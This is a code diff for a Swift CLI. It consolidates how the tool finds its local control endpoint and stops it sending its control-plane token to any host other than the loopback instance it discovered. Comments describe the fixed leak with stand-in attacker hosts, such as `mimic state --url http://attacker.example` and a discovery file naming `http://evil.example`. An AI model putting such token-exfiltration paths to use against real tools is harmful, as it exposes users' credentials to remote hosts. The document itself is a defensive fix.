@@ -51,17 +51,23 @@ public struct ControlClient: Sendable {
     /// file. Fails with actionable advice rather than a connection error, because "nothing is running"
     /// is by far the most common reason a command cannot proceed.
     ///
+    /// The reader is `ControlEndpointDiscovery` in `Domain` — the one implementation of the
+    /// discovery contract, shared with the control plane's write side. The CLI used to carry a copy
+    /// of its own, and the copy had drifted: it did not honour `MIMIC_CONTROL_FILE`, so an isolated
+    /// run's `mimic` went looking for the developer's real instance. `environment` is threaded into
+    /// the file search for exactly that reason — the same dictionary decides the destination, the
+    /// credential, *and* which file advertises them.
+    ///
     /// `discovered` is a parameter so a test can name the file this resolution sees. Left `nil` — as
-    /// every production caller leaves it — it reads the real search paths, which is what it did
-    /// before.
+    /// every production caller leaves it — it reads the search paths the environment names.
     public static func discover(
         explicitURL: String? = nil,
         environment: [String: String] = ProcessInfo.processInfo.environment,
         timeout: TimeInterval = 30,
-        discovered: ControlEndpointFileReader.Endpoint? = nil
+        discovered: ControlEndpoint? = nil
     ) throws -> ControlClient {
-        let endpoint = discovered ?? ControlEndpointFileReader.discover()
-        guard let url = ControlEndpointFileReader.resolveBaseURL(
+        let endpoint = discovered ?? ControlEndpointDiscovery.discover(environment: environment)
+        guard let url = ControlEndpointDiscovery.resolveBaseURL(
             explicit: explicitURL,
             environment: environment,
             discovered: endpoint
@@ -75,10 +81,10 @@ public struct ControlClient: Sendable {
             // used to be resolved independently — `resolveBaseURL` returns an explicit `--url`
             // verbatim, `resolveToken` fell back to the local instance's `control.json` — so
             // `mimic state --url http://attacker.example` posted this machine's live control-plane
-            // token to that host. See `ControlEndpointFileReader.namesDiscoveredInstance`.
-            token: ControlEndpointFileReader.resolveToken(
+            // token to that host. See `ControlEndpointDiscovery.namesDiscoveredInstance`.
+            token: ControlEndpointDiscovery.resolveToken(
                 environment: environment,
-                discovered: ControlEndpointFileReader.namesDiscoveredInstance(url, endpoint)
+                discovered: ControlEndpointDiscovery.namesDiscoveredInstance(url, endpoint)
                     ? endpoint
                     : nil
             )
@@ -170,8 +176,8 @@ public struct ControlClient: Sendable {
 
 /// One HTTP exchange: hand over a request, get the body and the response back.
 ///
-/// A closure rather than a second protocol, matching how this module and `Persistence` already inject
-/// the one piece a test needs to replace — `ControlEndpointFileReader.discover(isProcessAlive:)` and
+/// A closure rather than a second protocol, matching how this codebase already injects the one
+/// piece a test needs to replace — `ControlEndpointDiscovery.discover(isProcessAlive:)` and
 /// `ProjectStore.open(makeOnDisk:makeInMemory:)` are the same shape. It is the narrowest thing that
 /// can be substituted to reach `ControlClient.send`'s branches, and it is below all of them, so the
 /// decode logic under test is the real one rather than a reimplementation.
@@ -182,160 +188,6 @@ public typealias ControlHTTPExchange = @Sendable (URLRequest) async throws -> (D
 /// The three members are already exactly what the protocol asks for, which is the point: the seam was
 /// added around the type rather than through it, so no production call path changed on the way in.
 extension ControlClient: ControlTransport {}
-
-/// Indirection so `MimicCLICore` does not need to link the control-plane module (and therefore
-/// Vapor) just to locate an instance. The discovery format is part of the Domain contract.
-public enum ControlEndpointFileReader {
-    public static let fileName = "control.json"
-
-    public struct Endpoint: Codable, Sendable, Equatable {
-        public var apiVersion: String
-        public var port: Int
-        public var pid: Int
-        public var mode: String
-        /// What the instance *said* its base URL was. Decoded so the record round-trips, and never
-        /// routed on — `resolveBaseURL` derives the host from `port` instead, because a file that
-        /// gets to name the host is a file that can send the token off-box. Do not restore it here.
-        public var baseURL: String
-        /// Optional so a file written by a pre-token instance still decodes, and the CLI can say
-        /// "that Mimic is too old" instead of "unexpected response".
-        public var token: String?
-    }
-
-    public static func searchURLs(
-        homeDirectory: URL = FileManager.default.homeDirectoryForCurrentUser
-    ) -> [URL] {
-        [
-            homeDirectory
-                .appendingPathComponent("Library/Containers/devxa.Mimic/Data/Library/Application Support/devxa.Mimic", isDirectory: true)
-                .appendingPathComponent(fileName),
-            homeDirectory
-                .appendingPathComponent("Library/Application Support/devxa.Mimic", isDirectory: true)
-                .appendingPathComponent(fileName),
-        ]
-    }
-
-    /// Reads the first readable discovery file, skipping any whose process is gone.
-    ///
-    /// The liveness check is a parameter, exactly as it is on the control plane's own reader, because
-    /// a test cannot name a pid it can guarantee is dead: pick a plausible-looking one and the kernel
-    /// is free to hand it to somebody between the fixture being written and the file being read, so
-    /// the assertion passes or fails depending on what else the machine is doing.
-    ///
-    /// The `try?` on the decode is safe for the reason the one in ``ControlClient/send(_:)`` is:
-    /// every field of ``Endpoint`` except `token` is non-optional on a synthesized decoder, so a
-    /// file that decodes really does carry the `pid` this checks and the `port` resolution derives
-    /// from. `token` is Optional deliberately — a pre-token instance's file still decodes, so the
-    /// CLI can say "that Mimic is too old" instead of "unexpected response".
-    public static func discover(
-        searchURLs: [URL]? = nil,
-        isProcessAlive: (Int) -> Bool = ControlEndpointFileReader.isProcessAlive
-    ) -> Endpoint? {
-        for url in searchURLs ?? Self.searchURLs() {
-            guard let data = try? Data(contentsOf: url),
-                  let endpoint = try? ControlCoding.decode(Endpoint.self, from: data)
-            else { continue }
-            guard isProcessAlive(endpoint.pid) else { continue }
-            return endpoint
-        }
-        return nil
-    }
-
-    /// A discovery file left behind by a crashed instance must not make the CLI hang on a dead port.
-    public static func isProcessAlive(_ pid: Int) -> Bool {
-        guard pid > 0 else { return false }
-        if kill(pid_t(pid), 0) == 0 { return true }
-        return errno == EPERM
-    }
-
-    public static func resolveBaseURL(
-        explicit: String? = nil,
-        environment: [String: String] = ProcessInfo.processInfo.environment,
-        discovered: Endpoint? = nil
-    ) -> URL? {
-        if let explicit, let url = URL(string: explicit) { return url }
-        if let override = environment[ControlAPI.urlEnvironmentKey], !override.isEmpty {
-            return URL(string: override)
-        }
-        if let port = environment[ControlAPI.portEnvironmentKey], let value = Int(port) {
-            return URL(string: "http://127.0.0.1:\(value)")
-        }
-        // Derived from `port`, never read from `baseURL`.
-        //
-        // This line used to be `URL(string: discovered.baseURL)`, and `baseURL` is a decoded field of
-        // a file on disk. So a discovery file saying `http://evil.example` decided where the next
-        // command went, and `authorize` then put this instance's `X-Mimic-Token` — the credential the
-        // whole scheme exists to protect — in a header addressed to it, while `port` and `pid` sat
-        // alongside still looking reassuringly local. The host is not something the file gets to
-        // supply: the control plane binds `127.0.0.1` and nothing else, so the only thing worth
-        // reading out of that file is which port it landed on.
-        if let discovered { return URL(string: "http://127.0.0.1:\(discovered.port)") }
-        return nil
-    }
-
-    /// The token to present, environment first.
-    ///
-    /// The environment wins so that a caller who reached the instance via `MIMIC_CONTROL_URL` — a
-    /// forwarded port, a container — can supply the matching token the same way. Otherwise it comes
-    /// from the discovery file, which is the normal path and needs no configuration at all.
-    ///
-    /// **Passing `discovered` asserts that the file describes where this request is going.** This
-    /// function does not check that and cannot: it never sees the destination. `ControlClient.discover`
-    /// is where the two meet, and it passes `nil` here whenever ``namesDiscoveredInstance(_:_:)``
-    /// says no. Do not call this with a `discovered` you have not matched against the URL you are
-    /// about to dial: that pairing is the defect ``namesDiscoveredInstance(_:_:)`` describes.
-    public static func resolveToken(
-        environment: [String: String] = ProcessInfo.processInfo.environment,
-        discovered: Endpoint? = nil
-    ) -> String? {
-        if let override = environment[ControlAPI.tokenEnvironmentKey], !override.isEmpty {
-            return override
-        }
-        return discovered?.token
-    }
-
-    /// Whether `url` is the loopback endpoint `discovered` describes — the one place a token read out
-    /// of that file may be sent.
-    ///
-    /// Resolution answered two questions independently and hardened only one of them. `resolveBaseURL`
-    /// returns an explicit `--url` (or `MIMIC_CONTROL_URL`) verbatim, with no check on its host, while
-    /// `resolveToken` fell back to whatever the *local* instance's `control.json` carried. So
-    /// `mimic state --url http://attacker.example` put this machine's live control-plane credential
-    /// into an `X-Mimic-Token` header addressed to that host — in a reader that already refuses, in
-    /// `resolveBaseURL` above, to route on the `baseURL` a file names, for exactly this reason.
-    ///
-    /// A locally discovered token is a credential *for one instance*, so both halves have to match: a
-    /// loopback host, and the port that instance advertised. Anything else gets no token — a remote
-    /// host, a loopback-shaped name like `127.0.0.1.evil.example`, or another port on this machine,
-    /// which is some other process. The request then either needs none or comes back `401`, which
-    /// `send` reports with the message that names the header and the file.
-    ///
-    /// The legitimate local case still works: `--url http://127.0.0.1:<port>` naming the running
-    /// instance is the same host and the same port the file advertises, so it carries the token. And a
-    /// caller genuinely reaching Mimic through a forwarded port or a container supplies the token the
-    /// documented way, with `MIMIC_CONTROL_TOKEN`, which `resolveToken` takes first and this does not
-    /// touch — that is the caller naming a credential rather than this CLI guessing one.
-    ///
-    /// Compared against `url.host` rather than against the URL string, so a loopback spelling that
-    /// appears anywhere *other* than the host — in userinfo, in a path, in a query — is not a
-    /// loopback host.
-    public static func namesDiscoveredInstance(_ url: URL, _ discovered: Endpoint?) -> Bool {
-        guard let discovered,
-              let host = url.host?.lowercased(),
-              loopbackHosts.contains(host)
-        else { return false }
-        return url.port == discovered.port
-    }
-
-    /// The spellings of "this machine" a control URL can carry: the two loopback literals and the
-    /// name for them a person types. The IPv6 one is listed with and without its brackets so the
-    /// check does not turn on whether `URL.host` strips them.
-    ///
-    /// Deliberately not the whole `127.0.0.0/8` range. Nothing in this CLI derives an address
-    /// anywhere else in it — `resolveBaseURL` writes `127.0.0.1` and the control plane binds
-    /// `127.0.0.1` — so admitting the rest would widen where a token may go for no case that exists.
-    private static let loopbackHosts: Set<String> = ["127.0.0.1", "::1", "[::1]", "localhost"]
-}
 
 /// Failures that belong to the CLI itself rather than to a command.
 public enum CLIFailure: Error, LocalizedError, Equatable {
